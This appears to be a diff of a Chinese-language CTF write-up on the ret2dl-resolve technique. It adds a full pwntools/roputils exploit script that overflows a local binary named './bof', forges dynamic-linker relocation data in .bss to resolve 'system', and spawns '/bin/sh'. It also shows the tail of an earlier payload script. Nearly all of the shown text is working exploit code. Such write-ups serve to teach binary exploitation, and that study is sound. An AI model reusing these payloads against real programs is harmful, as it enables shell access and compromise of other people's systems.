@@ -261,6 +261,7 @@ pwndbg> x /s 0x08048278+0x4c
 
 ## exp
 “你猜怎么伪造`.st_name`”
+
 ```py
 #!/usr/bin/python
 
@@ -323,4 +324,31 @@ payload2 += cmd + '\x00'
 payload2 += 'A' * (100 - len(payload2))
 r.sendline(payload2)
 r.interactive()
+```
+
+“给出一个使用roputils的方法”
+```py
+from pwn import *
+from roputils import ROP
+fpath='./bof'
+p=process(fpath)
+elf=ELF(fpath)
+rop=ROP(fpath)
+# context.terminal=['zsh']
+bss_addr=elf.bss()
+ret_offset=0x6c+4
+payload=rop.retfill(ret_offset)
+base_stage=bss_addr+0x20
+payload+=rop.call('read',0,base_stage,100)
+#第一个是fake_reloc...的地址，第二个是调用函数的参数列表
+payload+=rop.dl_resolve_call(base_stage+0x30,base_stage)
+payload+=rop.fill(0x100,payload)
+p.send(payload)
+
+payload=rop.string('/bin/sh')
+payload+=rop.fill(0x30,payload)
+payload+=rop.dl_resolve_data(base_stage+0x30,'system')
+payload+=rop.fill(100,payload)
+p.send(payload)
+p.interactive()
 ```
